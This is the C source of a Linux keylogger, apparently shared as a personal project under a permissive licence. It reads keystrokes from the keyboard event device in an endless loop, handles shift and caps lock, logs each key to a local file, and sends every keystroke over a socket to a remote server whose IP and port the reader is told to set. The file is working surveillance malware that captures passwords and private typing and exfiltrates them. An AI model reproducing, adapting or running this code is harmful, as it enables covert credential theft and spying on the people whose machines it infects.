/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */


//all necessary libraries
#include <stdio.h> 
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#include "network.h"
#include "keylog.h"


#define LOGFILE "./keylog" //log file where the items are logged
#define SERVER "127.0.0.1" //change this to ip address of server desired
#define PORT 8080 // change this to port of server desired

/*
main function for keylogger where core
prgram resides
*/
int main(int argc, char **argv){

    //variables for functioning
    struct input_event event;
    char *key;
    int shiftHeld = 0;
    int capsLock = 0;

    char keyboardEventFile[256];

    //detecting and obtaining keyboard event file
    detectKeyboard(keyboardEventFile);

    printf("%s\n", keyboardEventFile);

    //generating sockets and connecting to server
    int socket_connection;

    socket_connection = createSocket();

    int result;

    result = connectToServer(SERVER, socket_connection, PORT);

    int file_descriptor = open(keyboardEventFile, O_RDONLY);

    //looping through indefinetely
    while(1)
    {   
        //reading event file
        read(file_descriptor, &event, sizeof(event));

        //if it was a shift being pressed down note it down as being pressed
        if((event.type == EV_KEY) && (event.value == 1)){
            if((event.code == 42) || (event.code == 54)){
                shiftHeld = 1;
            }
        }

        //if it is shift being released or caps lock note down by changing corresponding varaiables
        else if((event.type == EV_KEY) && (event.value == 0)){
            if((event.code == 42) || (event.code == 54)){
                shiftHeld = 0;
            }

            if(event.code == 58){
                capsLock = !capsLock;
            }

            else{
                //otherwise just translate and identify the specific key that was pressed
                key = mapButtonRelease(event.code, shiftHeld, capsLock);
                int result = logKeyStroke(LOGFILE, key); //write it into the log file
                if(result == 1){
                   continue;
                }
                result = sendData(key, socket_connection); //send over socket
                if(result == -1){
                    continue;
                }
            }
        }
    }

    return 0;
}
